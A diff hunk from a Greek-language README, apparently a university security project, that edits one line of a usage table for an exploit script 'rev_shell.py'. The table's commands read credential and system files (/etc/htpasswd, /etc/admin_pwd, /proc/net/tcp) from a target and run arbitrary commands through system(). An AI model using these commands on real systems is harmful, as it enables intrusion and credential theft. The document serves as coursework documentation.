@@ -1546,7 +1546,7 @@ binary_payload.write(argument)
    |-|-|-|
    |python3 rev_shell.py 8000 /etc/htpasswd|Επιστρέφει τα περιεχόμενα του αρχείου που δόθηκε σαν όρισμα|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/34-Rev_Shell_Example1.png)|
    |python3 rev_shell.py 8000 "ls -la" -s|Εκτελεί τη δοσμένη εντολή μέσω της `system()`|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/35-Rev_Shell_Example2.png)|
-   |python3 rev_shell.py 9000 www/htpasswd -p my_pass|Αλλάζει τον κωδικό που θα χρησιμοποιηθεί για το authentication. Κυρίως για χρήση σε τοπικούς servers|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/36-Rev_Shell_Example3.png)|
+   |python3 rev_shell.py 9000 www/htpasswd -p my_pass|Αλλάζει τον κωδικό που θα χρησιμοποιηθεί για το authentication (κυρίως για χρήση σε τοπικούς servers)|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/36-Rev_Shell_Example3.png)|
    |python3 rev_shell.py 8000 /proc/self/maps -t None|Αλλάζει το timeout του request (χρησιμεύει κυρίως για πειραματισμούς)|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/37-Rev_Shell_Example4.png)|
    |python3 rev_shell.py 8000 /proc/net/tcp -xd respond.txt -xp payload.txt|Κάνει εξαγωγή του respond και του payload αντιστοίχως, στα αρχεία που δόθηκαν ως ορίσματα|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/38-Rev_Shell_Example5.png)|
    |python3 rev_shell.py 8000 /etc/admin_pwd -d|Απενεργοποιεί τα μηνύματα προόδου του request|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/39-Rev_Shell_Example6.png)|
